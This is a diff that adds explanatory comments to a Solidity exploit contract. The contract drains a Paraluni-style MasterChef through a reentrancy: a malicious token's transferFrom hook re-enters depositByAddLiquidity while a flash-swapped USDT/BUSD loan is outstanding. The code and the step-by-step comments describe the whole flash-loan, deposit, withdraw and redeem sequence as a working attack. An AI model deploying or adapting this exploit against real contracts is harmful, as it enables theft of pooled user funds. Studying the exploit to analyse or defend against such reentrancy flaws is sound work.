@@ -38,6 +38,17 @@ interface IMasterChef {
 // Malicious deposit token. Its transferFrom hook approves MasterChef to spend
 // the contract's real USDT/BUSD and re-enters depositByAddLiquidity before the
 // outer deposit's accounting settles — the reentrancy that inflates the stake.
+//
+// ============================================================
+// VULNERABILITY: Untrusted token callback during internal addLiquidity
+//   - depositByAddLiquidity(_pid, _tokens, _amounts) accepts ARBITRARY _tokens
+//   - It transferFrom's the _tokens (from caller), THEN calls router.addLiquidity()
+//   - router.addLiquidity does safeTransferFrom on those _tokens (msg.sender inside token = router != masterchef)
+//   - Malicious token's transferFrom can re-enter depositByAddLiquidity with attacker-controlled real-value tokens
+//   - The re-entrant deposit credits shares to `address(this)` (EvilToken) BEFORE outer call updates user stake accounting
+//   - No reentrancy guard, no validation that _tokens form the pid's canonical LP pair
+//   - Result: arbitrary value can be deposited "in the name of" the malicious token contract
+// ============================================================
 contract EvilToken {
     IMasterChef public immutable masterchef;
     IERC20 public immutable usdt;
@@ -58,7 +69,19 @@ contract EvilToken {
     }
 
     function transferFrom(address, address, uint256) external returns (bool) {
+        // ============================================================
+        // VULNERABILITY TRIGGER (callback path)
+        // This is called in TWO contexts during outer depositByAddLiquidity([token0,token1]):
+        //   1. Direct by MasterChef: msg.sender == masterchef → if false, no-op (just returns allowance true)
+        //   2. Indirect by PancakeRouter inside addLiquidity: msg.sender == router → if TRUE
+        //      → parks approvals + re-calls depositByAddLiquidity with REAL assets parked here
+        // The router callback is the exploit enabler because router != masterchef.
+        // ============================================================
         if (address(masterchef) != address(0) && msg.sender != address(masterchef)) {
+            // EXPLOIT STEP (reentrant): Use funds previously transferred to this EvilToken
+            // to perform a *real value* depositByAddLiquidity on pid 18 (USDT/BUSD pool).
+            // Because this executes while the outer depositByAddLiquidity is still on the call stack
+            // (before its post-addLiquidity userInfo update), the shares are minted to THIS contract (EvilToken).
             usdt.approve(address(masterchef), type(uint256).max);
             busd.approve(address(masterchef), type(uint256).max);
             address[2] memory tokens = [address(usdt), address(busd)];
@@ -69,6 +92,9 @@ contract EvilToken {
     }
 
     function redeem() external {
+        // EXPLOIT STEP (harvest): After the reentrant real deposit credited userInfo[address(this)=EvilToken]
+        // with a huge stake (from flash funds), this withdraws it on behalf of EvilToken.
+        // The removed liquidity + change gives the attacker the real drained USDT/BUSD.
         (uint256 _amount,) = masterchef.userInfo(18, address(this));
         masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
         usdt.transfer(msg.sender, usdt.balanceOf(address(this)));
@@ -93,6 +119,21 @@ contract ParaluniDrain {
     function run() external {
         token0 = new EvilToken(IMasterChef(address(0)), usdt, busd);
         token1 = new EvilToken(masterchef, usdt, busd);
+        // ============================================================
+        // EXPLOIT STEPS (high level)
+        // 1. Deploy two EvilToken "deposit tokens": token0 (dummy, no MC), token1 (malicious hook)
+        // 2. Flash-swap borrow 10k USDT + 10k BUSD (must repay inside callback)
+        // 3. Park flash funds onto token1 (so its hook can spend them)
+        // 4. Call depositByAddLiquidity using [token0, token1] as the pair tokens (tiny amts)
+        //    - MC pulls tiny EvilToken units
+        //    - MC calls router.addLiquidity → router calls token1.transferFrom (from MC's balance)
+        //    - router != MC → hook fires → reentrant real depositByAddLiquidity([USDT,BUSD], full)
+        //    - real deposit mints LARGE LP shares to address(token1) for pid=18
+        // 5. Withdraw the (tiny) stake recorded for attacker
+        // 6. Claim change, then token1.redeem() drains the LARGE stake credited to token1
+        // 7. Repay flash + forward profit
+        // VULNERABILITY EXPLOITED: arbitrary-token zap + router callback reentrancy into deposit path
+        // ============================================================
         // Flash-borrow 10,000 of each token from the USDT/BUSD Pancake pair. The
         // callback pancakeCall() must repay 0.25% + 1 by the end of the tx.
         pair.swap(10_000 * 1e18, 10_000 * 1e18, address(this), new bytes(1));
@@ -103,27 +144,46 @@ contract ParaluniDrain {
 
     // PancakeSwap flash-swap callback — the heart of the attack.
     function pancakeCall(address, uint256 amount0, uint256 amount1, bytes calldata) external {
-        // Move the flash-borrowed USDT/BUSD onto the malicious token1 so its
-        // transferFrom hook can deposit them during the re-entry.
+        // ============================================================
+        // EXPLOIT STEP 3: Park flash funds on the malicious token contract.
+        // These real balances will be spent by the re-entrant deposit inside the hook.
+        // ============================================================
         usdt.transfer(address(token1), usdt.balanceOf(address(this)));
         busd.transfer(address(token1), busd.balanceOf(address(this)));
+
+        // ============================================================
+        // EXPLOIT STEP 4: Initiate the outer zap-deposit using malicious token as one leg.
+        // This will cause the internal router.addLiquidity to invoke transferFrom on token1
+        // from router context → triggering the re-entrant real deposit credited to token1.
+        // ============================================================
         // Pool 18 deposit with the two EvilTokens. token1.transferFrom fires the
         // re-entrant depositByAddLiquidity([USDT,BUSD], full balances) before
         // the outer deposit's userInfo settles — inflating this contract's stake.
         address[2] memory tokens = [address(token0), address(token1)];
         uint256[2] memory amounts = [uint256(1), uint256(1)];
         masterchef.depositByAddLiquidity(18, tokens, amounts);
-        // Withdraw the (inflated) stake from the outer deposit.
+
+        // ============================================================
+        // EXPLOIT STEP 5: Withdraw whatever (small) position the attacker (this) received
+        // from the outer deposit (dummies produce negligible LP).
+        // ============================================================
         (uint256 _amount,) = masterchef.userInfo(18, address(this));
         masterchef.withdrawAndRemoveLiquidity(18, _amount, false);
+
         // Claim any leftover change held by MasterChef.
         address[] memory t = new address[](2);
         t[0] = address(busd);
         t[1] = address(usdt);
         masterchef.withdrawChange(t);
+
+        // ============================================================
+        // EXPLOIT STEP 6: Harvest the large stake that was credited under the EvilToken
+        // address itself via the re-entrant deposit. This is the actual profit.
+        // ============================================================
         // token1.redeem() withdraws ITS inflated stake and forwards USDT/BUSD
         // back here.
         token1.redeem();
+
         // Repay the flash loan: amount/9975*10000 + 10000 each (0.25% fee + 1).
         usdt.transfer(msg.sender, ((amount0 / 9975) * 10_000) + 10_000);
         busd.transfer(msg.sender, ((amount1 / 9975) * 10_000) + 10_000);
